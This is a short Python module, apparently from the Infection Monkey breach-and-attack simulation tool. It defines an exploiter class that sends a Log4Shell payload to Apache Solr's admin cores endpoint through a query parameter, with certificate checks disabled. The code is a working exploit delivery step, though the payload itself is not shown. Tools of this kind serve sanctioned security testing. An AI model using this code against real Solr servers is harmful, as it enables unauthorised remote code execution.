from logging import getLogger

import requests

from infection_monkey.i_puppet import TargetHost

from .constants import SERVICE_EXPLOITER_REQUEST_TIMEOUT
from .i_service_exploiter import IServiceExploiter

logger = getLogger(__name__)


class SolrExploit(IServiceExploiter):
    service_name = "Apache Solr"

    @staticmethod
    def trigger_exploit(payload: str, host: TargetHost, port: int):
        url = f"http://{host.ip}:{port}/solr/admin/cores?fu={payload}"
        try:
            requests.post(  # noqa DUO123
                url, timeout=SERVICE_EXPLOITER_REQUEST_TIMEOUT, verify=False
            )  # noqa DUO123
        except requests.ReadTimeout as e:
            logger.debug(f"Log4shell request failed {e}")

        return url
